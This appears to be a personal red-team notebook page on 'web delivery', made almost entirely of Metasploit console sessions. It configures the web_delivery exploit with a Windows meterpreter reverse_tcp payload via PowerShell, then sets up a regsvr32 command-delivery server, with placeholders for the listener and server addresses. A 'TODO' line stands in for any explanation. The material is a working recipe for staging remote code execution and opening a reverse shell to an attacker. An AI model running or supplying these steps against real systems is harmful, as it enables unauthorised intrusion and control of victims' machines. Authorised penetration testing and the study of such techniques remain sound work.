# Web Delivery

```
msf > use exploit/multi/script/web_delivery

msf exploit(multi/script/web_delivery) > set target 2

msf exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(multi/script/web_delivery) > options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on
                                       all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   PSH


msf exploit(multi/script/web_delivery) > set lhost <IP>

msf exploit(multi/script/web_delivery) > set lport <PORT>

msf exploit(multi/script/web_delivery) > set srvhost <server_IP>

msf exploit(multi/script/web_delivery) > set srvport <server_PORT>

msf exploit(multi/script/web_delivery) > run -j
```

TODO: Fill this info

```
msf > use auxiliary/server/regsvr32_command_delivery_server

msf auxiliary(server/regsvr32_command_delivery_server) > set target 2

msf auxiliary(server/regsvr32_command_delivery_server) > options

msf auxiliary(server/regsvr32_command_delivery_server) > set cmd <commands>

msf auxiliary(server/regsvr32_command_delivery_server) > set srvhost <server_IP>

msf auxiliary(server/regsvr32_command_delivery_server) > set srvport <server_PORT>

msf auxiliary(server/regsvr32_command_delivery_server) > run -j
```

---
## References

### Backlinks

- [[Scriptlet]]

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Command Execution/Command Prompt]]